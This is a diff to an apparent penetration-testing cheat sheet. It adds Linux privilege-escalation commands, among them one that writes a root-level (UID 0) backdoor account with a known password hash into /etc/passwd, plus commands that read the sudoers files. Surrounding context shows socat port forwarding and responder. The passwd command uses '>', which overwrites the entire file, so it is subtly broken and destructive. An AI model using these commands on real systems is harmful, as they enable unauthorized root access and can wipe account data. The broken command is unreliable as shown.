@@ -62,6 +62,12 @@ tree tmp
 ./socat tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
 ```
 
+#### create new user in /etc/passwd with root
+
+```
+echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
+```
+
 </details>
 
 ---
@@ -190,6 +196,8 @@ sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 ```
 cat /proc/version
 cat /etc/issue
+cat /etc/sudoers
+cat /etc/sudoers.d
 ps
 env
 sudo -l
@@ -386,6 +394,7 @@ responder -I eth0 -rdwv
 * [LES](https://github.com/mzet-/linux-exploit-suggester)
 * [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 * [linux Priv Checker](https://github.com/linted/linuxprivchecker)
+* [Git research](https://github.com/internetwache/GitTools)
 
 ---
 Happy hacking!
